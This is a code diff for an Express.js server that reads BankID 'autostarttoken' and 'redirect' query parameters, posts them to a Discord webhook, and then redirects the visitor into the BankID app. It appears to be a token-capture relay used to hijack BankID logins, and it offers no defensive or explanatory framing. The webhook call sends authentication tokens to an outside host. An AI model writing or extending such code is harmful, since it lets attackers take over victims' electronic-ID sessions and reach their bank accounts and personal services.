@@ -11,22 +11,23 @@
  app.use(express.json());
  
  app.get('/', (req, res) => {
-  // Extract the query string from req.originalUrl
-  const queryString = req.originalUrl.split('?')[1];
+  // Extract the query parameters from req.query
+  const { autostarttoken, redirect } = req.query;
 
-  if (!queryString) {
-    return res.status(400).send('Query parameters are required.');
+  if (!autostarttoken || !redirect) {
+    return res.status(400).send('Query parameters "autostarttoken" and "redirect" are required.');
   }
 
-  // Log the query string to console or webhook
-  sendDiscordWebhook(queryString);
+  // Log the query parameters to console or webhook
+  sendDiscordWebhook(`autostarttoken: ${autostarttoken}, redirect: ${redirect}`);
 
-  // Construct the redirect URL with the extracted query parameters
-  const redirectUrl = `bankid:///?autostarttoken=${queryString}`;
+  // Construct the redirect URL
+  const redirectUrl = `bankid:///?autostarttoken=${autostarttoken}&redirect=${redirect}`;
 
   // Redirect to the constructed URL
   res.redirect(redirectUrl);
 });
+
 
 
  
